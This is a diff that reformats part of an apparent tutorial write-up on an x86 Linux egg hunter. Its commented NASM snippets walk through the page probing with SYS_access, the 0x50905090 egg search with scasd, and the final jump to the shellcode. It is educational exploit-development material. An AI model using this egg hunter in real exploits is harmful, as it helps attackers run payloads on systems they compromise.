@@ -70,32 +70,32 @@ int 0x80            ; software interrupt; returns 0xfffffff2 on EFAULT
 ```
 
 ```nasm
-    ; compare return value of SYS_access to find writable page
-    cmp al, 0xf2        ; sets ZF when comparison is true
-    jz align_page       ; jumps to align_page when ZF is set
+; compare return value of SYS_access to find writable page
+cmp al, 0xf2        ; sets ZF when comparison is true
+jz align_page       ; jumps to align_page when ZF is set
 ```
 
 ```nasm
-    ; prepares for egg hunt
-    mov eax, 0x50905090 ; 4-byte egghunter key
-    mov edi, edx        ; EDX contains memory address of writable page
+; prepares for egg hunt
+mov eax, 0x50905090 ; 4-byte egghunter key
+mov edi, edx        ; EDX contains memory address of writable page
 ```
 
 ```nasm
-    ; hunts for first 4 bytes of egg; scasd sets ZF when match is true
-    scasd               ; compares [EDI] to value in EAX; increments EDI by 4 
-    jnz inc_address     ; jumps to inc_address when ZF is not set
+; hunts for first 4 bytes of egg; scasd sets ZF when match is true
+scasd               ; compares [EDI] to value in EAX; increments EDI by 4 
+jnz inc_address     ; jumps to inc_address when ZF is not set
 ```
 
 ```nasm
-    ; hunts for last 4 bytes of egg
-    scasd               ; hunts for last 4 bytes of egg
-    jnz inc_address
+; hunts for last 4 bytes of egg
+scasd               ; hunts for last 4 bytes of egg
+jnz inc_address
 ```
 
 ```nasm
-    ; jumps to beginning of shellcode
-    jmp edi
+; jumps to beginning of shellcode
+jmp edi
 ```
 
 ## Egg Hunter Shellcode: Full Code
